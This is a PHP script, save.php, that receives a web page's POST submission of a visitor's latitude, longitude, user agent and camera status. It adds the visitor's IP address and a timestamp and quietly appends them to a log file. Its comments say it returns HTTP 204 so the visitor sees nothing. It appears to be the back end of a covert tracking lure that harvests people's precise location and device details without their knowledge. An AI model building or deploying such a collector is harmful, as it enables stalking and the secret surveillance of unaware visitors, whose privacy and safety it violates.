<?php
// save.php
// Accepts POST from the page and appends sanitized data to newfile.txt
// Returns no content (HTTP 204) so the user sees nothing from the server.

// Only allow POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Method Not Allowed
    exit;
}

// Helper to safely get and limit string length
function safe_post($key, $max_len = 500) {
    $val = filter_input(INPUT_POST, $key, FILTER_UNSAFE_RAW);
    if ($val === null) return '';
    // remove null bytes and control characters
    $val = preg_replace('/[\x00-\x1F\x7F]/u', '', (string)$val);
    return mb_substr($val, 0, $max_len);
}

$lat = safe_post('lat', 64);
$long = safe_post('long', 64);
$user_agent = safe_post('user_agent', 1000);
$camera_agent = safe_post('camera_agent', 16);

$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

// Prepare log entry
$entry = implode("\n", [
    "Time: $time",
    "Latitude: $lat",
    "Longitude: $long",
    "IP: $ip",
    "User_Agent: $user_agent",
    "Camera_Agent: $camera_agent",
    str_repeat('-', 60),
]) . "\n";

// Write safely (append + exclusive lock)
$file = __DIR__ . DIRECTORY_SEPARATOR . 'newfile.txt';
if (false === file_put_contents($file, $entry, FILE_APPEND | LOCK_EX)) {
    // If write fails, quietly return server error code without body
    http_response_code(500);
    exit;
}

// Return 204 No Content so nothing is shown to the user
http_response_code(204);
exit;
?>
